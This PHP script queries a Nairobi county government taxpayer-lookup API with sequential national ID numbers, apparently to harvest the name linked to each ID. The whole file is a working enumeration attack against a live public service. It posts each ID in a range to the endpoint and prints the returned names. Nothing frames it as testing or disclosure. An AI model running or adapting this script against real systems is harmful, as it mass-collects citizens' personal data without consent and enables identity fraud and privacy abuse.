<?php
$stime = time();
function httpPost($url, $data)
{
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     //   curl_setopt($ch, CURLOPT_INTERFACE, "192.168.0.16");
        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}

$url1 = 'https://nairobiservices.go.ke/api/authentication/auth/individual/kra/detail';
//for ($i = 41870850; $i <= 41870900; $i++) {
    for ($i = 10847600; $i <= 10847700; $i++) {
    $fields = ['id_number' => $i];
    $data = httpPost($url1, $fields);
    $obj = json_decode($data, true);

    if (isset($obj['data'])) {
        echo 'ID no.:' . $i . ' = ' . $obj['data']['name'] . '<br/>';
    } elseif (isset($obj['error'])) {
        echo $obj['error'] . '<br/>';
    } else {
        echo json_encode($obj) . '<br/>';
    }
}


$etime = time() - $stime;

echo $etime . 'Secs';
